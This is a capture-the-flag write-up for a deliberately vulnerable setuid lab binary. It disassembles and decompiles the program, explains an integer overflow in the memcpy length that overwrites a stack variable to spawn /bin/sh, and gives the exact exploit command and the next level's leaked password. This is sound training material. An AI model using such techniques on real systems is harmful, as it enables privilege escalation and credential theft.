What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1*
	-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
	-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile

A `bonus1` binary.

	$ gdb ./bonus1
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048424 <+0>:	push   %ebp
	0x08048425 <+1>:	mov    %esp,%ebp
	=> 0x08048427 <+3>:	and    $0xfffffff0,%esp
	0x0804842a <+6>:	sub    $0x40,%esp
	0x0804842d <+9>:	mov    0xc(%ebp),%eax
	0x08048430 <+12>:	add    $0x4,%eax
	0x08048433 <+15>:	mov    (%eax),%eax
	0x08048435 <+17>:	mov    %eax,(%esp)
	0x08048438 <+20>:	call   0x8048360 <atoi@plt>
	0x0804843d <+25>:	mov    %eax,0x3c(%esp)
	0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
	0x08048446 <+34>:	jle    0x804844f <main+43>
	0x08048448 <+36>:	mov    $0x1,%eax
	0x0804844d <+41>:	jmp    0x80484a3 <main+127>
	0x0804844f <+43>:	mov    0x3c(%esp),%eax
	0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
	0x0804845a <+54>:	mov    0xc(%ebp),%eax
	0x0804845d <+57>:	add    $0x8,%eax
	0x08048460 <+60>:	mov    (%eax),%eax
	0x08048462 <+62>:	mov    %eax,%edx
	0x08048464 <+64>:	lea    0x14(%esp),%eax
	0x08048468 <+68>:	mov    %ecx,0x8(%esp)
	0x0804846c <+72>:	mov    %edx,0x4(%esp)
	0x08048470 <+76>:	mov    %eax,(%esp)
	0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
	0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
	0x08048480 <+92>:	jne    0x804849e <main+122>
	0x08048482 <+94>:	movl   $0x0,0x8(%esp)
	0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
	0x08048492 <+110>:	movl   $0x8048583,(%esp)
	0x08048499 <+117>:	call   0x8048350 <execl@plt>
	0x0804849e <+122>:	mov    $0x0,%eax
	0x080484a3 <+127>:	leave  
	0x080484a4 <+128>:	ret    
	End of assembler dump.

If we give it to `Ghidra` and polish it a bit:

	int	main(int argc, char **argv)
	{
		int		uVar1;
		char	local_3c[40];
		int		local_14;

		local_14 = atoi(argv[1]);
		if (local_14 < 10)
		{
			memcpy(local_3c, argv[2], local_14 * 4);
			if (local_14 == 1464814662)
				execl("/bin/sh", "sh", 0);
			uVar1 = 0;
		}
		else
			uVar1 = 1;
		return (uVar1);
	}

First guess is to overflow the buffer of 40 into the int next to it with `memcpy` to overwrite its value. However, it'll copies only <argv[1] * 4> bytes. We need 44, but 44 itself won't pass the `< 10` check. For that, we'll overflow the int of `atoi` in the negatives, to get a positive when it'll be `* 4` for `memcpy`. 2147483647 (`int max`) - 44 (buffer of 40 + int) = 2147483603. -2147483603 + -2147483648 (`int min`) + -1 (overflow) = -4294967252. -4294967252 / 4 = -1073741813.

Now that we have the first argument, let's do the second. We'll put 40 fillers for the buffer, and the int should be right after, so we'll put 1464814662 in hexa little endian (1464814662 => `0x574f4c46` => `\x46\x4c\x4f\x57`)

	$ ./bonus1 -1073741813 $'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A\x46\x4C\x4F\x57'
	$ cat /home/user/bonus2/.pass
	579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
